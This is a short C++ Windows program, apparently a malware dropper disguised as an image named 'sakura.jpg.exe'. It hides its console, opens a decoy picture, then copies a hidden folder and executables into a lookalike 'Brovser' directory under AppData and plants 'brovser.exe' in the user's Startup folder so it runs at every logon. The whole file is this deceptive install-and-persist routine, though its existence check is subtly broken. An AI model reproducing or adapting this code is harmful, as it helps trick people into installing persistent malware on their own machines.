#include <windows.h>

int main(){
    FreeConsole();
    system("start good_folder\\sakura.jpg");
    int a{system("@echo off IF exist C:\\Users\\%USERNAME%\\AppData\\Local\\Brovser\\good_folder ( echo 1 ) ELSE ( echo 0) ")};
    if (a==0){
    system("mkdir C:\\Users\\%USERNAME%\\AppData\\Local\\Brovser\\good_folder");
    system("xcopy good_folder C:\\Users\\%USERNAME%\\AppData\\Local\\Brovser\\good_folder /s /e /h");
    system("copy sakura.jpg.exe C:\\Users\\%USERNAME%\\AppData\\Local\\Brovser");
    system("copy c:\\Users\\%USERNAME%\\AppData\\Local\\Brovser\\good_folder\\brovser.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
    }
    return 0;
}